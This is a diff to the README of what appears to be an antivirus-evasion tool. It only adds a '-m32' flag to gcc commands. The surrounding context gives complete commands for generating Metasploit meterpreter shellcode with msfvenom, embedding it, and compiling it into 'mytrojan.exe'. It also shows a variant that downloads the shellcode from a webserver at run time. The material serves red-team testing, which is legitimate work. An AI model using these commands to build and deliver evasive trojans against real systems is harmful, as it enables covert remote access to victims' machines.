@@ -81,7 +81,7 @@ Example 1, compile shellcode into the .exe file:
 $ msfvenom -p windows/meterpreter/bind_tcp -f c -a x86 --platform Windows > sh.txt
 $ ./format.sh sh.txt > sh_clean.txt
 $ ./make_avet -f sh_clean.txt
-$ wine gcc.exe -o mytrojan.exe avet.c
+$ wine gcc.exe -m32 -o mytrojan.exe avet.c
 ```
 
 Example 2, make an .exe file that downloads a shellcode from a webserver:
@@ -90,7 +90,7 @@ $ msfvenom -p windows/meterpreter/bind_tcp -f c -a x86 --platform Windows > sh.t
 $ ./format.sh sh.txt > sh_clean.txt
 $ cp sh_clean.txt /var/www
 $ ./make_avet -u 192.168.2.112/sh_clean.txt
-$ wine gcc.exe -o mytrojan.exe avet.c
+$ wine gcc.exe -m32 -o mytrojan.exe avet.c
 ```
 
 Check out the other options as well:
@@ -107,7 +107,7 @@ Some notes
 Rebuild avet.exe:
 No problem, ensure no content is in defs.h (`echo "">defs.h`), then compile with:
 ```
-$ wine gcc.exe -o avet.exe avet.c
+$ wine gcc.exe -m32 -o avet.exe avet.c
 ```
 
 Have a look for build.sh for easier handling.
